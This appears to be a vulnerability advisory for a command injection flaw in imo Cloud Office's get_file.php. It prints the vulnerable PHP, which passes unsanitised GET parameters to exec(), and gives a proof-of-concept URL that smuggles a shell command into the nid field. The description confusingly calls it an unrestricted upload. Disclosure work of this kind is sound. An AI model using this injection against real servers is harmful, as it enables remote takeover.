# imo cloud office get_file.php remote command execution vulnerability

## Vulnerability Description

imo cloud office /file/NDisk/get_file.php filtering is not strictly caused by unlimited upload of files, and attackers can directly obtain website permissions through this vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">imo Cloud Office</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645878070559-eaed5393-f82d-4b08-8b95-54e91e5ceae0-20220313162918737.png)

Vulnerability file get_file.php

```javascript
<?php
// 放置在 mfs 服务器上用于获取文件列表，配合 nd_verify_large_file.php 使用
if(empty($_GET['cid']) || empty($_GET['nid']))
	exit;
$cid = $_GET['cid'];
$nid = $_GET['nid'];
$mainDir = dirname(__FILE__) . '/../upload/NDiskData/normal/' . $cid . '/';
exec("ls {$mainDir}*_{$nid}_*", $r);
$ret = array();
foreach($r as $v)
	$ret[md5_file($v)] = str_replace(dirname(__FILE__) . "/../upload/NDiskData/normal/{$cid}/", '', $v);
echo json_encode($ret);
```

Verify POC

```javascript
/file/NDisk/get_file.php?cid=1&nid=;pwd;
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1645880486605-ff738b08-cb7a-4039-b079-a167e13bc567.png)